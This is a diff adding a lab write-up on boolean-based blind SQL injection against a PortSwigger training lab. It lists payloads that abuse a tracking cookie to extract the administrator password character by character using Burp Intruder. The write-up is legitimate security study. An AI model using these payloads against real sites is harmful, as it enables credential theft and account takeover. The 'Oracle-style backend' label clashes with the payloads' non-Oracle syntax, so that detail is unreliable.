@@ -234,3 +234,42 @@ When table/column names are unknown, `information_schema.tables` and
 `information_schema.columns` let you enumerate the entire schema before
 extraction — this recon step is only needed on non-Oracle databases,
 since Oracle uses `all_tables` / `all_tab_columns` instead.
+
+## Lab 8: Blind SQL Injection with Conditional Responses
+
+**Category:** Blind SQL Injection (Boolean-based)
+**Database:** Oracle-style backend (PortSwigger Web Security Academy)
+**Objective:** Exploit a blind SQLi vulnerability in the `TrackingId` cookie to extract the administrator's password character-by-character using only the presence/absence of a "Welcome back" message as a boolean oracle, then log in as administrator.
+
+### Payload
+```sql
+-- Confirm boolean oracle
+TrackingId=xyz' AND '1'='1
+TrackingId=xyz' AND '1'='2
+
+-- Confirm table/user existence
+TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
+TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
+
+-- Determine password length
+TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>N)='a
+
+-- Extract each character via Burp Intruder (Cluster bomb)
+TrackingId=xyz' AND (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§
+```
+
+### Breakdown
+- Used Burp Repeater to confirm a working boolean oracle — `'1'='1'` shows "Welcome back", `'1'='2'` doesn't.
+- Confirmed the `users` table and `administrator` user exist via single-character subquery checks.
+- Stepped `LENGTH(password)>N` up from Repeater until the condition flipped false — password is 20 characters.
+- Sent the `SUBSTRING` request to Burp Intruder, set two payload positions (offset 1–20, character a-z0-9), attack type **Cluster bomb**.
+- Set a Grep - Match rule for "Welcome back" to flag true conditions per row.
+- Read the matching character off each offset row in the results grid.
+
+### Result
+Extracted password: `l1mw6ekepq9ay1g0idf4`. Logged in as `administrator` → lab solved.
+
+### Key Takeaway
+When manually reading results off a Burp Intruder grid, ambiguous characters (`0` vs `o`, `1` vs `l`, `5` vs `S`) will silently break your login attempt and look like a failed exploit even though the extraction was correct. Copy/export the payload values directly rather than eyeballing them off the table.
+
+---
